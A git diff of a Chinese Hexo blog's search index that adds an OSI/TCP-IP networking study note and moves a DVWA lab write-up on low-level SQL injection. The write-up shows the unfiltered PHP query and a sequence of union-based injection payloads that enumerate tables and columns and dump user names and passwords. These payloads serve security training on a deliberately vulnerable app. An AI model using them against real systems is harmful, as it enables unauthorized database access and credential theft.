@@ -396,6 +396,340 @@ gpg:               已导入：1</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>OSI参考模型及TCP/IP协议栈</title>
+    <url>/posts/7e4a66b0/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+
+<h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><h3 id="OSI参考模型简介"><a href="#OSI参考模型简介" class="headerlink" title="OSI参考模型简介"></a>OSI参考模型简介</h3><ul>
+<li>为什么使用分层结构<ul>
+<li>降低复杂性</li>
+<li>提高设备的兼容性</li>
+<li>提供标准化接口</li>
+<li>促进模块化工作</li>
+<li>简化教学和学习</li>
+<li>易于实现与维护</li>
+</ul>
+</li>
+<li>OSI模型将数据通讯过程分割为7个层次，每个层次都负责各自的 功能，并设计了对应的协议实现这些功能，各个层次之间有标准化 的接口</li>
+</ul>
+<h3 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114859.png" alt="8" loading="lazy"></p>
+<h3 id="OSI参考模型各层次的功能"><a href="#OSI参考模型各层次的功能" class="headerlink" title="OSI参考模型各层次的功能"></a>OSI参考模型各层次的功能</h3><table>
+<thead>
+<tr>
+<th>OSI参考模型层次</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>提供应用程序间通讯</td>
+<td>为网络用户之间的通信提供专用的程序 <br> 为用户提供网络管理、文件传输、事务处理等服务 <br>应用层包含的协议最多，也最复杂</td>
+</tr>
+<tr>
+<td>表示层</td>
+<td>数据表示、加密、解密</td>
+<td>向上对应用层提供服务，向下接收会话层服务 <br>确保应用接收到的数据可读 <br>规范数据格式与结构 <br> 数据压缩和解压、加密和解密</td>
+</tr>
+<tr>
+<td>会话层</td>
+<td>会话建立维护</td>
+<td>会话层不参与具体的传输，它提供包括访问验证和会话管理 <br>在不同的进程间建立管理维持会话，并能使会话获得同步 <br>担负应用进程服务要求，而运输层不能完成的那部分工作</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td>建立主机端到端链接</td>
+<td>处理主机之间的传输问题 <br> 确保数据传输的可靠性 <br>建立、维护和终止虚电路 <br>容错机制和流量控制</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>寻址和路由</td>
+<td>路由数据包，提供逻辑寻址 <br>基于网络层地址进行不同网络系统间的最优路径选择 <br>网络层为建立网络连接和为上层提供服务</td>
+</tr>
+<tr>
+<td>数据链路层</td>
+<td>介质访问、链路管理</td>
+<td>负责将上层数据封装成固定格式的帧 <br>为了防止数据传输过程中产生误码，在帧尾部加上校验信息 <br>还有流控机制 会试探接收方缓存调整速率大小</td>
+</tr>
+<tr>
+<td>物理层</td>
+<td>二进制传输</td>
+<td>定义了电气、机械、形状针脚等物理特性。 <br> 主要功能是完成相邻节点之间原始比特流的传输，它关心的 是如何用物理信号表示0和1</td>
+</tr>
+</tbody></table>
+<h3 id="报文封装与解封装"><a href="#报文封装与解封装" class="headerlink" title="报文封装与解封装"></a>报文封装与解封装</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114904.png" alt="9" loading="lazy"></p>
+<h3 id="数据在不同网络设备之间转发"><a href="#数据在不同网络设备之间转发" class="headerlink" title="数据在不同网络设备之间转发"></a>数据在不同网络设备之间转发</h3><ul>
+<li><p>发送方对原始数据进行封装，通过介质发送到下一跳设备 </p>
+</li>
+<li><p>中间的网络设备对数据包进行解封装，查看对应信息，根据表项进行转发 </p>
+</li>
+<li><p>数据经过中转达到目的设备，解封装后到达目标应用程序</p>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114906.png" alt="10" loading="lazy"></p>
+<h2 id="TCP-x2F-IP协议栈"><a href="#TCP-x2F-IP协议栈" class="headerlink" title="TCP&#x2F;IP协议栈"></a>TCP&#x2F;IP协议栈</h2><h3 id="与OSI模型的区别"><a href="#与OSI模型的区别" class="headerlink" title="与OSI模型的区别"></a>与OSI模型的区别</h3><ul>
+<li>TCP&#x2F;IP总共定义了4层</li>
+<li>OSI的1、2层合并为网络接入层 </li>
+<li>OSI的5、6、7层合并为网络应用层 </li>
+<li>OSI模型与TCP&#x2F;IP模型都是描述网络设备之间通讯标准流程</li>
+<li>TCP&#x2F;IP模型是Internet的基本协</li>
+</ul>
+<h3 id="TCP-x2F-IP协议桟与OSI参考模型对应关系"><a href="#TCP-x2F-IP协议桟与OSI参考模型对应关系" class="headerlink" title="TCP&#x2F;IP协议桟与OSI参考模型对应关系"></a>TCP&#x2F;IP协议桟与OSI参考模型对应关系</h3><table>
+<thead>
+<tr>
+<th>TCP&#x2F;IP</th>
+<th>OSI</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>应用层<br>表示层<br>会话层</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td>传输层</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>网络层</td>
+</tr>
+<tr>
+<td>网络接入层</td>
+<td>数据链路层 <br> 物理层</td>
+</tr>
+</tbody></table>
+<h3 id="TCP-x2F-IP协议栈各层功能"><a href="#TCP-x2F-IP协议栈各层功能" class="headerlink" title="TCP&#x2F;IP协议栈各层功能"></a>TCP&#x2F;IP协议栈各层功能</h3><h4 id="应用层功能"><a href="#应用层功能" class="headerlink" title="应用层功能"></a>应用层功能</h4><p>为应用提供网络服务</p>
+<ul>
+<li>网络应用<ul>
+<li>微博、微信、QQ……</li>
+</ul>
+</li>
+<li>邮件服务（SMTP、POP3）<ul>
+<li>Outlook、新浪邮箱……</li>
+</ul>
+</li>
+<li>网页服务（http、https）<ul>
+<li>百度、搜狐、网易</li>
+</ul>
+</li>
+<li>网络管理<ul>
+<li>SNMP</li>
+</ul>
+</li>
+<li>远程登陆<ul>
+<li>Telnet、ssh</li>
+</ul>
+</li>
+<li>地址服务<ul>
+<li><pre><code>DNS、DHCP
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h4><p>提供端到端传输服务</p>
+<ul>
+<li>基于TCP的协议，可靠传输、有重传机制<ul>
+<li>FTP、SMTP、Telnet、HTTP</li>
+</ul>
+</li>
+<li>基于UDP的协议传输，不可靠、效率高<ul>
+<li>TFTP、SNMP、DHCP</li>
+</ul>
+</li>
+</ul>
+<p>TCP&#x2F;UDP端口号范围是<code>0~65535</code>，其中<code>0~1023</code>是熟知端口号，已固定分配给常用应用程序</p>
+<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
+<li><p>提供主机到主机的传输服务</p>
+</li>
+<li><p>IP</p>
+<ul>
+<li>提供主机到主机的传输服务</li>
+</ul>
+</li>
+<li><p>ICMP</p>
+<ul>
+<li>辅助IP工作,提供出错和控制信息</li>
+</ul>
+</li>
+<li><p>ARP</p>
+<ul>
+<li>解析IP与MAC的映射</li>
+</ul>
+</li>
+</ul>
+<h4 id="网络接入层"><a href="#网络接入层" class="headerlink" title="网络接入层"></a>网络接入层</h4><ul>
+<li><p>在相邻节点提供数据传输服务</p>
+</li>
+<li><p>局域网</p>
+<ul>
+<li>IEEE802.2	定义LLC子层</li>
+<li>IEEE802.3 	以太网标准</li>
+</ul>
+</li>
+<li><p>广域网</p>
+<ul>
+<li>HDLC(高级数据链路控)协议)</li>
+<li>PPP(点对点协议,类别:数据链路层协议)</li>
+<li>Frame Relay(帧中继)</li>
+</ul>
+</li>
+</ul>
+<h3 id="常见协议端口号"><a href="#常见协议端口号" class="headerlink" title="常见协议端口号"></a>常见协议端口号</h3><h4 id="TCP端口号"><a href="#TCP端口号" class="headerlink" title="TCP端口号"></a>TCP端口号</h4><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>FTP</td>
+<td>21</td>
+<td>HTTP</td>
+<td>80</td>
+<td>SMTP</td>
+<td>25</td>
+</tr>
+<tr>
+<td>FT-daada</td>
+<td>20</td>
+<td>HTTPS</td>
+<td>443</td>
+<td>POP3</td>
+<td>110</td>
+</tr>
+<tr>
+<td>Telnet</td>
+<td>23</td>
+<td>SQL</td>
+<td>１４３３</td>
+<td>Tacacs＋</td>
+<td>４９</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>２２</td>
+<td>Oracle</td>
+<td>１５２１</td>
+<td>DNS</td>
+<td>５３</td>
+</tr>
+</tbody></table>
+<h4 id="UDP端口号"><a href="#UDP端口号" class="headerlink" title="UDP端口号"></a>UDP端口号</h4><table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">DHCP</td>
+<td>67、68</td>
+<td>Radius</td>
+<td>1812、1813</td>
+<td>WINS</td>
+<td>42</td>
+</tr>
+<tr>
+<td align="center">TFTP</td>
+<td>69</td>
+<td>NTP</td>
+<td>123</td>
+<td>NETBIOS</td>
+<td>137、138、139</td>
+</tr>
+<tr>
+<td align="center">SNMP</td>
+<td>１６１、１６２</td>
+<td>RIP</td>
+<td>５２０</td>
+<td>DNS</td>
+<td>５３</td>
+</tr>
+</tbody></table>
+<h3 id="传输层的区别"><a href="#传输层的区别" class="headerlink" title="传输层的区别"></a>传输层的区别</h3><ul>
+<li>UDP报文结构简单，传输效率高，但不具备排序功能以及重传机制，数据包到达目的地时，有可能因为网 络问题，出现乱序或者丢包现象<ul>
+<li>常用在视频、语音应用等</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114916.png" alt="1" loading="lazy"></p>
+<ul>
+<li><p>TCP报文结构相对复杂，具备序列号、确认号、窗口大小等字段，使其具备排序功能、重传机制、滑动窗 口机制，确保数据传输的可靠性，使得数据能够准确按序到达目的地 </p>
+<ul>
+<li>常用在HTTP、FTP等可靠传输</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114918.png" alt="2" loading="lazy"></p>
+<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul>
+<li><p>基于TCP协议</p>
+<ul>
+<li>传输数据前:由TCP建立连接</li>
+<li>传输过程中:由TCP解决可靠性、有序性，进行流量控制</li>
+<li>传输结束后：由TCP拆除链接</li>
+</ul>
+</li>
+<li><p>TCP头部字段</p>
+<ul>
+<li>端口号：源端口标识发送方的进程,目的端口表示接收方的进程</li>
+</ul>
+</li>
+<li><p>序列号:保证数据传输的有序性,确认收到的数据进行确认</p>
+<ul>
+<li>窗口大小:传输阶段每次连续发送数据的大小</li>
+</ul>
+</li>
+<li><p>Flag字段:</p>
+<ul>
+<li>ACK:确认标志号,置于1表示确认号有效,表示收到虽短的特定数据<ul>
+<li>RST:复位标志.至于1表示拒绝错误和非法的数据包,复位错误的链接</li>
+</ul>
+</li>
+<li>SYN:同步标志序号,至于1表示同步需要,用来建立连接<ul>
+<li>FIN:结束标志,至于1表示链接将被断开,用于拆除链接</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114921.png" alt="3" loading="lazy"></p>
+<h3 id="TCP协议工作过程"><a href="#TCP协议工作过程" class="headerlink" title="TCP协议工作过程"></a>TCP协议工作过程</h3><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>数据传输之前：三次握手建立连接</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114923.png" alt="4" loading="lazy"></p>
+<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p> 数据传输过程中，发送方发送窗口大小的数据，接收方只进行一次确认</p>
+<p> 如果接收方处理能力不足，会调整窗口大小，接收方按新的窗口进行数据发送</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114925.png" alt="5" loading="lazy"></p>
+<h4 id="重传机制"><a href="#重传机制" class="headerlink" title="重传机制"></a>重传机制</h4><p> 当某个包因网络问题，传输失败，接收方仅确认上一个数据包 </p>
+<p>发送方将根据确认号，进行数据重传</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114927.png" alt="6" loading="lazy"></p>
+<h4 id="拆除连接"><a href="#拆除连接" class="headerlink" title="拆除连接"></a>拆除连接</h4><p>四次挥手拆除连接， TCP通过FIN置位为1表示拆除连接</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114929.png" alt="7" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PiKachu--XSS</title>
     <url>/posts/96f58941/</url>
     <content><![CDATA[<h2 id="XSS（跨站脚本）概述"><a href="#XSS（跨站脚本）概述" class="headerlink" title="XSS（跨站脚本）概述"></a>XSS（跨站脚本）概述</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;<br>    2.存储型XSS;<br>    3.DOM型XSS;</p>
@@ -1658,6 +1992,55 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
       </tags>
   </entry>
   <entry>
+    <title>dvwa--SQL注入(low)</title>
+    <url>/posts/cb7e67e1/</url>
+    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
+
+<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
+<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
+<p>① 输入1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
+<p>②输入1’ 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
+<p>③输入1 and 1&#x3D;1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
+<p>④输入1 and 1&#x3D;2提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
+<p>**猜解 SQL 查询语句中的字段数, **</p>
+<p>①1’ order by 1#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
+<p>②1’ order by 2#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
+<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
+<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
+<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
+<p><strong>查询当前的数据库, 以及版本</strong></p>
+<p>1’ union select version(),database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
+<p>获取数据库中的表,</p>
+<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
+<p>获取表中的字段名,</p>
+<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
+<p>获得字段中的数据,</p>
+<p>1’ union select user, password from users#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>DVWA</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa--盲注</title>
     <url>/posts/75e4ecec/</url>
     <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
@@ -1888,55 +2271,6 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
       </tags>
   </entry>
   <entry>
-    <title>dvwa--SQL注入(low)</title>
-    <url>/posts/cb7e67e1/</url>
-    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
-
-<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
-<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
-<p>① 输入1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
-<p>②输入1’ 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
-<p>③输入1 and 1&#x3D;1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
-<p>④输入1 and 1&#x3D;2提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
-<p>**猜解 SQL 查询语句中的字段数, **</p>
-<p>①1’ order by 1#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
-<p>②1’ order by 2#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
-<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
-<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
-<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
-<p><strong>查询当前的数据库, 以及版本</strong></p>
-<p>1’ union select version(),database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
-<p>获取数据库中的表,</p>
-<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
-<p>获取表中的字段名,</p>
-<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
-<p>获得字段中的数据,</p>
-<p>1’ union select user, password from users#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>DVWA</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/posts/4a17b156/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -2121,7 +2455,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-NBNkIUJn" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-EIgHpfun" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -2950,336 +3284,6 @@ pip3 install dailycheckin --upgrade -t .</code></pre>
       </categories>
       <tags>
         <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OSI参考模型及TCP/IP协议栈</title>
-    <url>/posts/7e4a66b0/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-
-
-
-<h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><h3 id="OSI参考模型简介"><a href="#OSI参考模型简介" class="headerlink" title="OSI参考模型简介"></a>OSI参考模型简介</h3><ul>
-<li>为什么使用分层结构<ul>
-<li>降低复杂性</li>
-<li>提高设备的兼容性</li>
-<li>提供标准化接口</li>
-<li>促进模块化工作</li>
-<li>简化教学和学习</li>
-<li>易于实现与维护</li>
-</ul>
-</li>
-<li>OSI模型将数据通讯过程分割为7个层次，每个层次都负责各自的 功能，并设计了对应的协议实现这些功能，各个层次之间有标准化 的接口</li>
-</ul>
-<h3 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114859.png" alt="8" loading="lazy"></p>
-<h3 id="OSI参考模型各层次的功能"><a href="#OSI参考模型各层次的功能" class="headerlink" title="OSI参考模型各层次的功能"></a>OSI参考模型各层次的功能</h3><table>
-<thead>
-<tr>
-<th>OSI参考模型层次</th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>应用层</td>
-<td>提供应用程序间通讯</td>
-<td>为网络用户之间的通信提供专用的程序 <br> 为用户提供网络管理、文件传输、事务处理等服务 <br>应用层包含的协议最多，也最复杂</td>
-</tr>
-<tr>
-<td>表示层</td>
-<td>数据表示、加密、解密</td>
-<td>向上对应用层提供服务，向下接收会话层服务 <br>确保应用接收到的数据可读 <br>规范数据格式与结构 <br> 数据压缩和解压、加密和解密</td>
-</tr>
-<tr>
-<td>会话层</td>
-<td>会话建立维护</td>
-<td>会话层不参与具体的传输，它提供包括访问验证和会话管理 <br>在不同的进程间建立管理维持会话，并能使会话获得同步 <br>担负应用进程服务要求，而运输层不能完成的那部分工作</td>
-</tr>
-<tr>
-<td>传输层</td>
-<td>建立主机端到端链接</td>
-<td>处理主机之间的传输问题 <br> 确保数据传输的可靠性 <br>建立、维护和终止虚电路 <br>容错机制和流量控制</td>
-</tr>
-<tr>
-<td>网络层</td>
-<td>寻址和路由</td>
-<td>路由数据包，提供逻辑寻址 <br>基于网络层地址进行不同网络系统间的最优路径选择 <br>网络层为建立网络连接和为上层提供服务</td>
-</tr>
-<tr>
-<td>数据链路层</td>
-<td>介质访问、链路管理</td>
-<td>负责将上层数据封装成固定格式的帧 <br>为了防止数据传输过程中产生误码，在帧尾部加上校验信息 <br>还有流控机制 会试探接收方缓存调整速率大小</td>
-</tr>
-<tr>
-<td>物理层</td>
-<td>二进制传输</td>
-<td>定义了电气、机械、形状针脚等物理特性。 <br> 主要功能是完成相邻节点之间原始比特流的传输，它关心的 是如何用物理信号表示0和1</td>
-</tr>
-</tbody></table>
-<h3 id="报文封装与解封装"><a href="#报文封装与解封装" class="headerlink" title="报文封装与解封装"></a>报文封装与解封装</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114904.png" alt="9" loading="lazy"></p>
-<h3 id="数据在不同网络设备之间转发"><a href="#数据在不同网络设备之间转发" class="headerlink" title="数据在不同网络设备之间转发"></a>数据在不同网络设备之间转发</h3><ul>
-<li><p>发送方对原始数据进行封装，通过介质发送到下一跳设备 </p>
-</li>
-<li><p>中间的网络设备对数据包进行解封装，查看对应信息，根据表项进行转发 </p>
-</li>
-<li><p>数据经过中转达到目的设备，解封装后到达目标应用程序</p>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114906.png" alt="10" loading="lazy"></p>
-<h2 id="TCP-x2F-IP协议栈"><a href="#TCP-x2F-IP协议栈" class="headerlink" title="TCP&#x2F;IP协议栈"></a>TCP&#x2F;IP协议栈</h2><h3 id="与OSI模型的区别"><a href="#与OSI模型的区别" class="headerlink" title="与OSI模型的区别"></a>与OSI模型的区别</h3><ul>
-<li>TCP&#x2F;IP总共定义了4层</li>
-<li>OSI的1、2层合并为网络接入层 </li>
-<li>OSI的5、6、7层合并为网络应用层 </li>
-<li>OSI模型与TCP&#x2F;IP模型都是描述网络设备之间通讯标准流程</li>
-<li>TCP&#x2F;IP模型是Internet的基本协</li>
-</ul>
-<h3 id="TCP-x2F-IP协议桟与OSI参考模型对应关系"><a href="#TCP-x2F-IP协议桟与OSI参考模型对应关系" class="headerlink" title="TCP&#x2F;IP协议桟与OSI参考模型对应关系"></a>TCP&#x2F;IP协议桟与OSI参考模型对应关系</h3><table>
-<thead>
-<tr>
-<th>应用层</th>
-<th>应用层<br>表示层<br>会话层</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>传输层</td>
-<td>传输层</td>
-</tr>
-<tr>
-<td>网络层</td>
-<td>网络层</td>
-</tr>
-<tr>
-<td>网络接入层</td>
-<td>数据链路层 <br> 物理层</td>
-</tr>
